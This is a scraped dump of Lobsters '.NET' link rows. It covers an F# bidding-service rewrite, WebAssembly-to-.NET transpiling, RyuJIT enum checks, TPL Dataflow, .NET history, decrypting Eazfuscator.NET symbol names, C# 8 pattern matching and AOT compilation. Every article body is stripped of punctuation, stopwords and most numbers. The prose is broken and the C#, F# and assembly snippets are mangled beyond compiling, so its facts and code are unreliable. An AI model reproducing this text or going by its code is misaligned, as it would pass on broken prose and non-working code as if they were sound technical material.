erlang go nt use highly concurrent lockfree data structure program tricky hard debug get right often need formal proof ton test different cpu architecture brace bug try run program non architecture change compiler version testing arm great thanks weaker atomic memory model problem including rendering solved careful benchmark guided architecture note one lockfree renderer seen twice slow original mutexlocked one reason poor architecture choice sea c boost template irony fate state original pacer would accept batch bid request run strategy reply le could answer bid reqs packet however done single core budget change configuration reload could happen every minute run parallel change state bidder acessing one strategy using susceptible budget change incoming order bit bad luck libck help would misbehave cause overspending requiring manual intervention one major improvement phasing strategy make strategy stateless least le susceptible instruction ordering almost eliminated incidence rate continuous strategy addition new one taking long time time special consideration test made lockfree part clear code reached end life new rewrite necessary rewrite higher level language make u productive needed language guarantee answer always given input helpful unit testing debugging put functional road also need strong type system force use right unit measure instance bidding cent instead dollar finally immutability handy come concurrency make sure body messing state another using needing stronger guarantee good support pattern matching heuristic choice rust haskell ocaml f coreclr scala another story another day fire minion first attempt try rust rewrite rust good system language strong guarantee month became clear ecosystem far stable usable love language strongly dislike ecosystem geological compilation time like haskell ocaml sadly haskell emphasizes laziness making hard debug lack debugging native generated code go haskell ocaml ocaml native debugger still work progress f stand jitted offer strong type system tooling great accept work visual studio code unit measure proved useful writing budget related code actor message want safely concurrent common wisdom suggests using actor model immutability nt want end problem shared variable line erlang sophisticated erlang f offer mailbox basic building block actor system simplified initial architecture looked like arrow represent bidirectional message client client actor represent connection previous node call gateway gateway external world processor strategy applied incoming bid request answer back change budget ad campaign get sent message processor watcher watcher actor loop waiting budget change ad campaign change synchronize final state processor simple design communication done message passing actor keep state everything go smooth hoped point team member joined effort started deploying test node day later came surprise benchmark showing poor throughput maxing around bid reqs using core time profile test machine p aux grep fspacer user sll dotnet exec sudo perfcollect collect session pid sudo perf script f flamegraphstackcollapseperfpl flamegraphflamegraphpl flamegraphsvg first benchmark showed time spent socket connection f developer team gave pipeline try throughput went bid reqs performance poor started translating pacer testinghammering tool f golang see make difference continue profiling htop showed thread never saturated maximizing around usage per core lot thread hopping happening examining perf data perf report flamegraph gave following cpu consumption clrlifosemaphore wait parsing request whooping allocating string pattern matching f systemnetsocketsdll threadpoolnative notifyrequestcomplete threadpoolnative requestworkerthread flamegraph purple cpu time made another attempt reduce synchronization time time merging processor client together client actor processor also yielded throughput achieving bid reqs comparison partial golang implementation able handle bid reqs using old architecture still enough examining corefx code showed linux epoll loop run single thread event dispatched afterward task consume creates needle waiting time least effort maximized value return would native module network handling bidrequest parsing c thy shall receive nt want rewrite everything scratch definitely nt want handle edge case epoll choice use libuv architecture opt use core networking uvloop running thread callback passed f uvloop instance event loop call parsing bid request line code throughput ranged using golang hammer bid reqs using another pony hammer nt need reduce cache miss pinning specific core final flamegraph purple time handle req showing time spent f minimal coreclr r good note giant call tower caused missing callgraph dwarf flag perf fnoomitframepointer compiling gcc conclusion corefx async socket linux coreclr par framework definitely nt match m window performance golang achieved bid reqs box corefx busy waiting golang good candidate shared state race condition tricky deal require bit golang debugging experience might reevaluate golang route ca nt scale future sure experience debug shared mutable state golang note though atypical application typical use case would still recommend corefx socket finally microsoft like see investment corefx linux
147,Lobsters,dotnet,"C#, F#, .NET programming",Running WebAssembly and WASI with .NET,https://ericsink.com/entries/wasm_wasi_dotnet.html,running webassembly wasi net,running webassembly wasi net pardon dust hood alternative pinvoke performance link acknowledgment http webassemblygithubiospec http http githubcomcranestationwasisysroot github ryanlamanskydotnetwebassembly http githubcomjbevaincecil http githubcommzuckerminiray http githubcomctestsuitectestsuite http githubcomwebassemblywabt open source http,webassembly wasi net moment lack better name calling project nutshell net compiler webassemblywasi module might misusing term compiler maybe called transpiler translator whatever call project take webassembly module convert net assembly disk resulting dll interpreted contains function webassembly module translated wasm instruction cil instruction example start c code sqlite shell application compile wasm clang transpile net assembly run net core result sqlite shell entirely managed code pinvokes involved much work progress current status basic thing work example netified sqlite shell read write sqlite database file seem fully interoperable regular sqlite build pardon dust like said nt ready anybody try using anything serious top head core stuff following problem webassembly instruction nt implemented yet webassembly instruction implemented slowdreadful placeholder quite wasi method implemented yet wasi spec still flux probably change finalized wasi implementation currently work net core us thing like streamread span byte performance main thing use drive project forward attempt get real c code compiled clang working certain webassembly instruction still throwing notimplementedexception code probably nt seen come back end clang yet sqlite stuff problem notably vfs platform layer using based demo vfs fullfeatured blog post announcing release polished project ready use rather like started remodeling living room waited everything torn apart covered dust invited people watch continue working messy continue hood clangllvm wasisysroot awesome initially nt thinking wasi wanted get wasm instruction converted cil instruction early test module nt external dependency started thing like int foo int x return x thing progressed got ambitious started work thing needed library function first real c program worked minirayc little ray tracer deps floating point math plus putchar put since put call string literal replaced putchar call would one io function implement anyway remember moment first got cil version output image regular native build compiler writer often find joy two file differing provenance identical content eventually decided dive try get sqlite work key wasisysroot implementation libc need wasi system call using clang instead building like clang build clang sysrootpathtowasisysroot result whole bunch functionality suddenly started working example figuring would write malloc free wasibasedlibc includes strcmp memset printf viewing pipeline c compiler give lot way test example github found c compiler testsuite test case compiler pass one failing test appear related problem code btw excited get result also understand serious commercial test suite like plum hall far comprehensive alternative pinvoke several reason one wanted experience nt done anything compilerish since c compiler wrote back around anybody else remember mac feeling need get better understanding net clr level getting hand really dirty best way also generally interested possibility compiling language clr using webassembly intermediate step one way maintain sqlitepclraw lowlevel wrapper around sqlite come issue mixing unmanaged code net suffered would nt life grand could compile c code net assembly rust want able write stuff rust easily consume net performance nt done careful benchmarking yet ready say anything quantitative however say informally performance c code converted cil disappointing link acknowledgment plan write project continue moving forward want give mention various resource found helpful webassembly spec exactly easy read high quality piece work http webassemblygithubiospec wasi mean webassembly system interface use webassembly outside browser imho going huge blog entry last month announced http wasisysroot http githubcomcranestationwasisysroot drawn inspiration information project wasmtodotnet arena especially one github ryanlamanskydotnetwebassembly back end using write actual net assembly file monocecil http githubcomjbevaincecil ray tracer mentioned http githubcommzuckerminiray c testsuite mentioned http githubcomctestsuitectestsuite webassembly binary toolkit handy http githubcomwebassemblywabt open source project github open source apache license http
148,Lobsters,dotnet,"C#, F#, .NET programming","Is it better to ""!= 0” or ”== mask” when working with enums (C#, RyuJIT)",https://www.tabsoverspaces.com/233785-is-it-better-to-not-equals-0-or-equals-mask-when-working-with-enums-csharp-ryujit,better mask working enums c ryujit,better mask working enums c ryujit method single value hypothesis code magic happening ryujit compare transformed test inventing comparison possible code generation macrofusing instruction real world usage line summary optimized end,better mask working enums c ryujit may min net core jit ryujit first thing first know enumhasflag method yet interested optimization around like know whether one two way enumvalue mask enumvalue mask mask check single value flag enum better writing better want say faster aspect primitive operation might affect overall result like code size register usage etc hypothesis guess going winner computer good stuff around value zero like jnz instruction code code following using enum aptly named myenum nothing special flag public enum myenum none b c two simple method assembly right public bool myenum myenum return myenum myenumb myenumb test dl setnz al movzx eax al ret public bool b myenum myenum return myenum myenumb test dl setnz al movzx eax al ret surprisingly result exactly assembly produced ryujit net core although kind make sense also learned setnz movzx instruction movzx strictly speaking returning value compare along way familiar could stop say use whatever feel like using given circumstance like look magic happening ryujit nowhere familiar internals ryujit thus idea happening time little thinking working enums enums number hence maybe behavior work number way know whether keep grepping something around enums look something general sadly value value value plain int show behavior spare two hour semimethodically read randomly walking ryujit code jump right action first magic happens lowering optimizeconstcompare compare transformed test even inventing comparison possible cover transforming mask part puzzle found code generation test reg reg instruction shorter cmp reg although saving huge byte writing jit every byte cpu cycle count moreover researching learned macrofusing instruction certain architecture test ie intel core intel nehalem macrofuse conditional jump instruction compared cmp real world usage said carefully looking lowering optimizeconstcompare line one see comparison invented second operand integral single bit mask constant mean code mask ie variable better use else luck ryujit smartness public bool myenum myenum myenum value return myenum value value edx cmp edx setz al movzx eax al ret public bool b myenum myenum myenum value return myenum value test edx setnz al movzx eax al ret summary although hypothesis correct learned direct compare really reason quite opposite finally spent time learning something new fun case ask enumhasflag optimized end
150,Lobsters,dotnet,"C#, F#, .NET programming","TPL Dataflow in .Net Core, in Depth - Part 1",https://www.blinkingcaret.com/2019/05/15/tpl-dataflow-in-net-core-in-depth-part-1/,tpl dataflow net core depth part,electroncgi electroncgi nodejs task parallel library dataflow dataflow systemthreadingtasksdataflow documentation type block official documentation dataflow itargetblock method property named method isourceblock ordering propagatecompletion task exception handling net link predicate documentation multiple dataflowblocknulltraget,tl dr article became long decided break part part present dataflow term capability element dataflow block concurrency hard hard easy end situation result execution concurrent code different depending order code executed worst part error hard reproduce might happen infrequently able consistently reproduce language feature like synchronization primitive eg lock keyword whose purpose enable concurrent code run predictable manner however hard tedious get right recently working electroncgi add ability handle request concurrently electroncgi allows nodejs process interact net core process sending request net core process handle especially useful want create crossplatform application using net core graphical user interface build gui using electron using html cs javascript logic written net one limitation first version electroncgidotnet request would served previous request response sent nodejs researching would best way enable electroncgi serve request concurrently stumbled upon task parallel library dataflow library dataflow allowed enable concurrent request electroncgi without using single lock statement also probably make future feature easier implement test even though surface dataflow seems simple use feature surprised enough time felt needed write blog post dataflow dataflow library nuget package systemthreadingtasksdataflow connect block order create pipeline graph different type block provide different functionality operate concurrently data arrives one block processed sent block linked simple example made example see different type block transformblock broadcastblock actionblock different option ensureordered maxdegreeofparallelism connected together linked might condition associated link block although never mentioned documentation imagine element dataflow called block exactly lend well drawn manner example type block even though official documentation dataflow split type block execution grouping batching think easier start interface implement itargetblock think block implement itargetblock block receive data type mean call post data block simplest block implement itargetblock actionblock example var actionblock new actionblock int async request var result await complicatedcomputation request consolewriteline result actionblockpost actionblockpost actionblockpost actionblockpost sending value actionblock execute complicatedcomputation value even though simple example allow u describe quite intricacy dataflow library first one might come surprise none code example run concurrently complicatedcomputation run finish run finally value take second complete handling take second thankfully really easy change actionblock constructor take second argument type executiondataflowblockoptions executiondataflowblockoptions property named maxdegreeofparallelism default mean one message time change value example meaning task running concurrently alternatively specify constant dataflowblockoptionsunbounded set upper limit look like var actionblock new actionblock int async request var result await complicatedcomputation request consolewriteline result new executiondataflowblockoptions maxdegreeofparallelism dataflowblockoptionsunbounded actionblockpost actionblockpost actionblockpost actionblockpost value take second complete get result second would run time another important aspect keep mind dealing target block capacity think capacity maximum number sum message executed waiting executed waiting sent another block case source block block illustrate let rewrite example boundedcapacity boundedcapacity property name used define capacity block var actionblock new actionblock int async request var result await complicatedcomputation request consolewriteline result new executiondataflowblockoptions boundedcapacity actionblockpost go execution actionblockpost get block wait queue first request finish actionblockpost rejected never executed actionblockpost get rejected time post called action block time deal good time mention post method return boolean true request accepted false otherwise might ideal want make sure request processed thankfully another method use called sendasync return task bool using method wait block ready accept request block eventually accepts request task resolve true reason block accept request eg exception task resolve false example look like var actionblock new actionblock int async request var result await complicatedcomputation request consolewriteline result new executiondataflowblockoptions boundedcapacity await actionblocksendasync processed immediately await actionblocksendasync accepted immediately go queue inside actionblock await actionblocksendasync block waiting one previous request finish processed throw exception var wasaccepted await actionblocksendasync wasaccepted false example request throw exception illustrate exception sendasync false speaking waiting thing finish itargetblock property named completion type task use notified target block finish two scenario cause completion task complete one explicitly calling complete method target block exception thrown handling request example var actionblock new actionblock int async request var result await complicatedcomputation request consolewriteline result actionblockpost actionblockpost actionblockcomplete var wasaccepted actionblockpost wasaccepted false actionblockcomplete await actionblockcompletion block request complete imagine request throw invalidoperationexception var actionblock new actionblock int async request var result await complicatedcomputation request consolewriteline result actionblockpost actionblockpost throw invalidoperationexception var wasaccepted actionblockpost wasaccepted true queue boundedcapacity default value unbounded actionblockcomplete try await actionblockcompletion block request throw exception catch exception ex consolewriteline exgettype name print invalidoperationexception isourceblock source block dataflow block implement isourceblock interface think source block block source data however data must get block somehow source block dataflow also target block important think keep mind source block linked block common type source block probably transformblock tinput toutput transform block receives instance tinput produce toutput example transformblock request response link actionblock response var transformblock new transformblock request response async request var response await processrequest request return response new executiondataflowblockoptions maxdegreeofparallelism dataflowblockoptionsunbounded var actionblock new actionblock response response consolewriteline responserequesttype responsehaserror request failed request successful transformblocklinkto actionblock transformblockpost new request requesttype request type transformblockpost new request requesttype request type transformblockpost new request requesttype request type simple example instance class request sent transform block performs operation sends action block print console request failed previous section saw default target block process one request time want transformblock process request parallel set maxdegreeofparallelism dataflowblockoptionsunbounded transformblock executiondataflowblockoptions reason highlighting way response sent linked action block probably surprise let illustrate example ordering imagine request type take second handled request type request type take second would reasonable expect see output request type second request type second happen instead second see output request type come time reason happens default behavior preserve order request mean even though request processed concurrently response first one first sent thankfully simple turn behavior response sent soon produced need set ensureordered property executiondataflowblockoptions false var transformblock new transformblock request response async request var response await processrequest request return response new executiondataflowblockoptions maxdegreeofparallelism dataflowblockoptionsunbounded ensureordered false var actionblock new actionblock response response consolewriteline responserequesttype responsehaserror request failed request successful transformblocklinkto actionblock transformblockpost new request requesttype request type take second process transformblockpost new request requesttype request type take second process transformblockpost new request requesttype request type take second process transformblockcomplete actionblockcompletionwait ensureorderedfalse see output request type second request type second might noticed last example called complete transform block called wait action block completion task propagatecompletion run last example never actually complete reason complete method called transform block waiting done action block completion task thankfully behavior configurable linking source target block pas dataflowlinkoptions instance second argument linkto function case want set propagatecompletion flag true transformblocklinkto actionblock new dataflowlinkoptions propagatecompletion true complete method called transform block action block also complete another important feature propagatecompletion also cause exception propagated imagine one request throwns invalidoperationexception transform block wrapped action block completion task wait call try catch block try actionblockcompletionwait catch aggregateexception ex var flataggregateexception exflatten consolewriteline flataggregateexceptioninnerexceptiongettype name print invalidoperationexception never deal aggregateexception wondering calling flatten recommend reading slightly outdated still relevant blog post task exception handling net alternatively async await catch invalidoperationexception trycatch directly await unwraps aggregateexception give first exception aggregate link predicate last example action block print console request failed checking haserror flag response transform block produce imagine care response error simply want discard response haserror flag set true use overload linkto receives predicate achieve var transformblock new transformblock request response async request var response await processrequest request return response new executiondataflowblockoptions maxdegreeofparallelism dataflowblockoptionsunbounded ensureordered false var actionblock new actionblock response response consolewriteline response request type responserequesttype transformblocklinkto actionblock new dataflowlinkoptions propagatecompletion true response responsehaserror linkto response haserror true transformblockpost new request requesttype request type produce response haserrortrue transformblockpost new request requesttype request type transformblockpost new request requesttype request type transformblockcomplete actionblockcompletionwait problem example though request produce response haserrortrue completion task never finish even propagatecompletion property set true dataflowlinkoptions make small aside show described documentation predefined source dataflow block type guarantee message propagated order received every message must read source block source block process next message therefore use filtering connect multiple target source make sure least one target block receives message otherwise application might deadlock entirely accurate since set ensureordered false message propagated order received part requirement least source receive message accurate end waiting ever completion task finish thankfully easy solve make sense need aware behavior source block link several target block come back problem later promise multiple linktos source block linked several target block fist link always given preference second link second always given preference third example transform block linked two action block first action block take finish var transformblock new transformblock request response r new response return await processrequest request var new actionblock response async response consolewriteline received response responserequesttype await taskdelay new executiondataflowblockoptions boundedcapacity var new actionblock response response consolewriteline received response responserequesttype new executiondataflowblockoptions boundedcapacity transformblocklinkto transformblocklinkto transformblockpost new request requesttype request handled transformblockpost new request requesttype request handled transformblockpost new request requesttype request handled await taskdelay enough time become free transformblockpost new request requesttype request handled example request processed request request processed waiting enough time make sure free request go back handled target block linked first previous section dataflowblocknulltraget type block named dataflowblocknulltarget target block consumes message nothing basically offer way discard message going back example specified predicate responsehaserror false linked transform block action block add new linkto dataflowblocknulltarget response make sure response error consumed end situation transform block never completes example addition dataflowblocknulltarget response var transformblock new transformblock request response async request var response await processrequest request return response new executiondataflowblockoptions maxdegreeofparallelism dataflowblockoptionsunbounded ensureordered false var actionblock new actionblock response response consolewriteline response request type responserequesttype transformblocklinkto actionblock new dataflowlinkoptions propagatecompletion true response responsehaserror linkto response haserror true transformblocklinkto dataflowblocknulltarget response transformblockpost new request requesttype request type produce response haserrortrue transformblockpost new request requesttype request type transformblockpost new request requesttype request type transformblockcomplete actionblockcompletionwait work saw previous section first linkto always given preference second message sent second block nulltarget one first block consume case happens reponsehaserror true end part next week post part cover buffering grouping managed read everything point thank let know thought comment related
151,Lobsters,dotnet,"C#, F#, .NET programming",.NET on Non-Windows Platforms: A Brief History,https://two-wrongs.com/dotnet-on-non-windows-platforms-brief-historic-summary,net nonwindows platform brief history,future release,brave new decided open source acquired github added linux compatibility layer window released source code large portion net framework net framework still run mind least see code prevents importantly allowed much greater information sharing mono net framework project mono started incorporating code net framework well contributing patch back point two relatively similar project accomplish thing compiling c running cli code one project work window project work many platform inevitable synergy would take turn incestous indeed microsoft acquired company behind mono however would bad strategy multiple level try wrestle mono brand microsoft flag one thing happened microsoft created crossplatform implementation cli called net core implement three part cli standard following name implement cli standard library net core implement cli cil implement cli f aside net core sdk also compiles c cil note mean microsoft competition owning major crossplatform cli implementation mono net reek embrace extend extinguish make rather uneasy unpopular opinion hope mass right privately worry see microsoft fencing net ecosystem soon enough also worth mentioning another natural consequence net core may seem like productionready implementation greater corporate backing far younger implementation want say anything amount corporate backing le three implementation cli standard net framework original implementation spawned standard ship window run window closedsource recently mono early opensource crossplatform implementation nowadays share lot code net framework large degree compatible net core young attempt microsoft create opensource crossplatform implementation brand taking liberty break compatibility net framework compatibility net framework net core microsoft envisions net core newer better version net framework take opportunity improve massively old cruft compatibility get bit sad far see seems like mono support plan support net core mean unless misunderstanding thing choose either use improvement net core build run code using mature mono project obviously leaf mono project bit uncertain future look like path ahead microsoft slowly deprecate net framework mono encourage people use net core indeed seems work future release net far enough future read much
152,Lobsters,dotnet,"C#, F#, .NET programming",Decrypting Eazfuscator.NET encrypted symbol names,https://blog.silentsignal.eu/2019/05/10/decrypting-eazfuscator-net-encrypted-symbol-names/,decrypting eazfuscatornet encrypted symbol name,read password directive dnspy section rfc getbytes padding padding oracle work github repository,many obfuscators different language offer reversible option easier field debugging eazfuscatornet one bit reverse engineering whole file restored original symbol password case developer left password file encryption read password directive get compiled executable binary obfuscator read later pipeline however developer missed step case executables thus password however even password thing could use official decryptor us gui thus limit automation limit length typical stack trace hence journey began find exact cryptographic construct used documentation linked reveals used crypto algorithm aes bit key strength cryptographic key algorithm derived password left u unknown box take password spit key aes process also know block chaining method used reverse engineered official decryptor latter also net application used dnspy handy tool licensed static dynamic analysis executables nice twist official decryptor part obfuscator suite also using obfuscator stripping symbol humanreadable name making comparison symbol harder educated guessing always important part reverse engineering case exception people use derive cryptographic key human readable string password wellknown cryptographic library platform include net builtin systemsecuritycryptography class implementing called defined section rfc dnspy struggled optimization binary caused release build careful stop execution place access memory started hate common error message evaluate thread unsafe point step run breakpoint hit finally managed find good spot getbytes method return actual output seen number iteration default net implementation also guessed hash function used parameter also default also proved right looking memory also revealed salt one used generate iv another static salt used derive actual aes key seemed used aes cbc mode deriving iv password way key used different salt place still two obstacle way reason decided use subset printable character thus encoded way looked like character set matched part usual alphanumerics resulted symbol remaining two chose puzzled u although library agree socalled urlsafe encoding us two nonalphanumeric symbol eazfuscatornet encoding used position resulting quite minute worth confusion simple inputreplace work rather produced gibberish decrypted fortunately used padding success decryption could determined soon decoding problem settled know padding work already understand helped u stage skip next paragraph short rundown using block cipher like aes encrypt message whose length exact multiple block size bit byte aes one need append padding byte pad message widely used algorithm calculates many byte need append fill last block every pad byte value number block size byte last block would byte append following byte message lucky fill last block already full block padding added way checking whether decryption successful easy one look last byte let call n check whether also value also padding oracle work important since obstacle rather annoying one using official decryptor already plaintextciphertext pair saw interesting pattern decrypting ciphertext knew plaintext byte reimplementation decryption process resulted seemingly garbage byte dynamic analysis proved last layer defense form xoring plaintext aes encryption single byte appending byte plaintext removing trailing byte performing xor operation remaining byte resulted expected symbol name python reimplementation available github repository mit license pull request welcome
153,Lobsters,dotnet,"C#, F#, .NET programming",Attempting to Decrease Compile Times in Unity,https://gamejolt.com/games/talesofkulplex/313193/devlog/tales-of-kulplex-devlog-6-attempting-to-decrease-compile-times-she9y7qf,attempting decrease compile time unity,,
155,Lobsters,dotnet,"C#, F#, .NET programming",Pattern Matching in C# 8.0,https://msdn.microsoft.com/en-us/magazine/mt833440.aspx,pattern matching c,article c pattern matching c filip ekberg introducing pattern matching figure figure evolution pattern matching c expressing pattern figure figure figure figure figure final word filip ekberg fekberg filip ekbergdev discus article msdn magazine forum,minute read article may volume number c pattern matching c filip ekberg may year seen ton feature c improve performance code importantly readability given fast pace software industry language certainly need keep evolve user base something widely used different programming language f swift kotlin sometimes find way c one pattern concept around long time something lot developer c space long waited c developer got taste power come pattern matching saw pattern starting take form later become extremely powerful interesting addition language language feature drastically changed way write software expect pattern matching c similar effect really need another language feature though use traditional approach course could although addition like pattern matching definitely change way lot u choose write code question could said language feature introduced year one changed c language drastically introduction languageintegrated query linq nowadays processing data people choose flavor personally like choose use linq case construct lessverbose code others opt traditional loop expect similar uptake pattern matching new functionality change way developer work move away verbose approach mind traditional approach going anywhere many developer opt stick triedandtrue solution additional language feature offer way complement c code project rather deprecate current code introducing pattern matching ever tried language like f kotlin likely seen example pattern matching action commonly used among lot different programming language course make code bit readable pattern matching rather simple look given structure based way look identify immediately use get bag fruit look immediately see difference apple pear even green time look bag fruit identify fruit green know fruit color distinguishing type fruit attribute fruit exactly pattern matching developer different way expressing identifying traditionally could check using simple condition need explicitly use apple end situation must first validate type attribute cast apple code quickly end bit messy frankly error prone example validate specific type fruit apple apply attribute constraint use cast like fruitgettype typeof apple fruitcolor colorgreen â var apple fruit apple another approach could take use keyword give little bit flexibility opposed previous example keyword also match derived apple fruit apple â makeapplepiefrom fruit apple case fruit derived type apple able make apple pie whereas earlier example would specific type apple fortunately better way mentioned language like swift kotlin allow use pattern matching part c introduced lightweight version pattern matching helpful though lack many nice feature present language refactor previous expression c code follows allows use switch match different pattern perfect improve previously available code switch fruit â case apple apple â â â makeapplepiefrom apple â â â break â default â â â break thing interesting first notice single type cast anywhere code also use apple matched case context keyword match derived apple well c code also read better much easier conversation around similar code c code saying fact fruit apple want use case match type share similar trait meaning inherit class instance implement interface case apple pear banana fruit missing way filter green apple seen exception filter feature introduced c allows catch certain exception certain condition met feature introduced keyword applicable pattern matching well match apple using pattern matching enter case condition met figure show figure applying filter using keyword fruit fruit new apple color colorgreen switch fruit â case apple apple applecolor colorgreen â â â makeapplepiefrom apple â â â break â case apple apple applecolor colorbrown â â â throwaway apple â â â break â case apple apple â â â eat apple â â â break â case orange orange â â â orangepeel â â â break figure illustrates order matter first look apple color green characteristic important another color say brown would indicate apple gone bad want throw apple want pie eat final apple pattern apple neither green brown color also see get orange peel skin limited handling one particular type long type inherit fruit good go everything else work like normal switch using since c example written entirely c question room improvement would say code still bit expressive side could made readable improving way pattern expressed also would help way express constraint data jump c look change introduced make life easier evolution pattern matching c latest version c currently preview introduces important patternmatching improvement try c use visual studio preview enable preview language feature visual studio general availability c later year expected time net core ship find new way express constraint property type make expression block pattern intuitive readable c language take another step forward introduce way work pattern familiar worked language like kotlin wonderful addition make code readable maintainable first option use something called switch expression instead traditional switch statement developer using since c example switch expression c var whatfruit fruit switch â apple apple â apple see instead write case break different match simply use pattern expression match fruit underscore mean care actual fruit matched fact initialized type fruit underscore match null well think simply matching specific type found apple returned string using like expressionbodied member introduced c saving character imagine possibility example could introduce expressionbodied member includes one switch expression also leverage power pattern matching like public fruit fruit get set public string whatfruit fruit switch â apple apple â apple get really interesting powerful following code show would perform pattern match traditional manner look decide one would prefer public string whatfruit â get â â â â fruit apple â â â â â â â â return apple â â â â â â return apple â obviously simple scenario imagine introduce constraint multiple type match use casted type within condition context sold idea yet thought welcome addition language please resist urge use switch expression every ifelse condition example check following code bool visible false var visibility visible switch â true visible â false hidden â null blink code indicates could four case nullable boolean course mindful use switch expression abuse syntax exactly would language feature already covered fact switch expression cut amount code write well make code readable true also adding constraint type change pattern matching c really stand look combination tuples deconstruction known recursive pattern expressing pattern recursive pattern output one patternmatch expression becomes input another patternmatch expression mean deconstructing object looking type property type forth expressed applying match sound complicated really look different type structure figure see rectangle inherits shape shape abstract class introduces property point way get shape onto surface know supposed go figure example deconstruct abstract class shape â public point point get set class rectangle shape â public int width get set â public int height get set â public void deconstruct int width int height point point â â â â width width â â â height height â â â point point â might wonder deconstruct method figure allows value instance new variable outside class commonly used together pattern matching tuples discover moment essentially three new way express pattern c specific use case positional pattern property pattern tuple pattern worry prefer normal switch syntax use patternmatching improvement well change addition language term pattern matching commonly referred recursive pattern positional pattern leverage deconstruct method class express pattern match given value get deconstruction given fact way defined deconstruct rectangle express pattern leverage position output like see figure figure positional pattern shape shape new rectangle â width â height â point new point x var result shape switch â rectangle null found rectangle without point â rectangle found rectangle â different null shape first match type shape case want match rectangle second applied pattern matched rectangle us deconstruct method together tuple syntax express value require particular position specify explicitly want point null use underscore express simply care keep mind order matter much version care top would always match pattern even rectangle point known positional pattern handy deconstruct available although deconstruct output lot value get rather verbose property pattern come play far matched different type scenario require match thing state looking different property value lack thereof following code describes care type get long match type containing point point value property like shape switch â point â point null point initialized observe code fact handle case shape null point initialized different value situation code throw exception could solved introducing default case using underscore could also say require point uninitialized handle uninitialized scenario lot le verbose using positional pattern work well situation add deconstruct method type matching finally tuple pattern leverage positional pattern allows compose tuple run match illustrate scenario operate different state opening closing locking door see figure particular situation may occur depending current state door operation want perform key may posse example using tuple pattern introduce state machine one commonly used c design lead mads torgersen check post pattern c figure tuple pattern var newstate state operation keyisvalid switch â stateopened operationclose â â â â â stateclosed â stateopened operationopen â â â â â â throw new exception â â â ca nt open opened door â stateopened operationlock true â â â statelocked â statelocked operationopen true â â â stateopened â stateclosed operationopen false â â statelocked â stateclosed operationlock true â â â statelocked â stateclosed operationclose â â â â â throw new exception â â â ca nt close closed door â state code figure first construct new tuple containing current state desired operation boolean checking user valid key simple scenario based different value match different situation constructing tuples together positional pattern tuple pattern try open door closed locked result new state telling door open door locked try unlock invalid key door remain locked try open door opened get exception get idea flexible interesting way approach situation previously verbose produced code lot le readable final word patternmatching improvement c together switch expression definitely change way developer write application c nearly two decade old evolved reflect way application built pattern matching simply latest expression evolution developer wise cautious overusing new principle pattern mindful code write make sure readable understandable maintainable fellow developer ask reckon change language help improve signaltonoise ratio code produce filip ekbergâ public speaker pluralsight author principal consultant author ekberg worked way sydney gothenburg decade experience c contact twitter fekberg via filip ekbergdev thanks following microsoft technical expert reviewing article bill wagner discus article msdn magazine forum
156,Lobsters,dotnet,"C#, F#, .NET programming",Fight the global warming: compile your C# apps ahead of time,https://medium.com/@MStrehovsky/fight-the-global-warming-compile-your-c-apps-ahead-of-time-9997e953645b,fight global warming compile c apps ahead time,fight global warming compile c apps ahead time ciel cheng unsplash jit v aot net application lifecycle missing il assembly aot equal redhawk project net runtime aot announced minimal configuration startup time benchmark time first user instruction time getprocesstimes add compilation output size reflection dynamic code prototype interpreter prototype jit corert anyway corert experimental jit aot gasoline engine electric engine,fight global warming compile c apps ahead timeahead time compilation aot part net ever since net framework came net framework technology called ngen allowed pregenerating native code data structure time installing net program global assembly cache ngen created cache code data structure runtime would require run installed program cache complete runtime would fall back time jit compilation loading needed great chunk typical apps could compiled ahead time waythe mono runtime synonym xamarin many stretched caching approach making possible run without time code generation runtime mono achieved making investment pregenerating code generic various stub ngen left outwhile called ahead time compilation way quite different c go swift rust compiled ahead time implementation aot compilation mainstream net runtimes leaf lot aot benefit table article explore benefitsphoto ciel cheng unsplashjit v aota common misconception difference justintime aheadoftime runtimes timing native code generation jitcompiling runtime generate native code demand app deployed running target environment aotcompiling runtime pregenerates native code part app buildthe source misconception lie mainstream runtimes implemented ahead time compilation past add native code net assembly call good aot compiler thatbefore dig detail let look life c app net application lifecyclewhen c compiler compiles source code generates il assembly il assembly exe dll file whose content split two category code app cil machine code abstract processor metadata code name type base class interface method field etc metadata look much like set database table information type field method defined within module also reference type field method defined il module following schematic capture gist advantage il format twofold independent hardware o code run andit great version resiliencythe version resiliency come fact cil pretty high level intermediate language instruction load field x type call method u type v detail instruction perform encoded metadatathe richness metadata also mean type declare derives type named list namespace systemcollections assembly systemcollections resolution mean happen runtime looking name systemcollections assembly definition base type change eg new method field added without requiring recompilation assembly defines type deriving itthe il format capture program high level ever used tool like ilspy probably saw generate nearperfect c source code il assembly il format close binary encoding source filewhat missing il assemblyit also interesting look il assembly find thing il assembly generated c compiler machine code specific cpu architecture il instruction directly executed processor interpreted compileddata structure would allow efficient execution programthe second point might require bit explanation knowing list field name type nice want eg allocate new instance type gc heap using new keyword c need know size type byte calculated going list field computing size field type potentially recursively base class lot work lot involves looking name thing across many assembliesa justintime compiled net runtime typically step called type loading build alternative representation type runtime allocated data structure stage compute information necessary effectively execute program besides size type include information list offset within instance given type contain gc pointer needed gc table virtual method implemented type needed virtual call runtime allocated data structure also pointer back il metadata access rarely used thingsnot aot equalfrom quite clear code also representation metadata il assembly different need runtime file format il assembly would come aot compilation objective none traditionally aot compiled language represent data structure waythe fact mainstream net runtimes use il format metadata even aot mode make sense evolutionary perspective runtimes built around concept represented il metadata started justintime runtimes building cache expensive thing code logical evolutionary step require major overhaul runtimekeeping il format come cost though il file format built hardware independency version resilience pregenerating code ahead time giving aspect keeping existing format net runtime team started looking direction year ago redhawk project clear evolving existing clr runtime form optimized aot would prohibitively expensive new runtime optimized aot borna net runtime aotredhawk project picked reusable part clr garbage collector see reference featureredhawk coreclr gc source code built minimal runtime around minimal runtime built redhawk project later became basis net native corert still find reference redhawk corert source tree githubwhen net native announced brought gain startup time ngen startup time improvement made possible using runtime file format optimized ahead time compilationremember schematic program represented il assembly look like corert ahead time compilation notice thing like list method type name type longer exist format actually needed program compiled ahead time real nonabstract cpu care code care type method belongs also care many field type access piece memory particular offsetthe minimal data structure schematic eetype structure describing systemstring type contain minimal amount data required run net program eg relatedtype field eetype make possible cast instance systemstring systemobject vtable slot support virtual method call basesize support object allocation garbage collectiondecompiling program representation source form pose level complexity eg decompiling cthe data structure minimal net runtime operates fact similar data structure c runtime library would operate size runtime minimal configuration corert compile kb selfcontained executable includes full runtime garbage collector size data target actually smaller gc used configuration still gc handle gigabyte workload azurestartup timethe main performance benefit ahead time compilation come form startup time justintime runtime aot runtime built around il format spend considerable amount time thing support running program actually running code startup 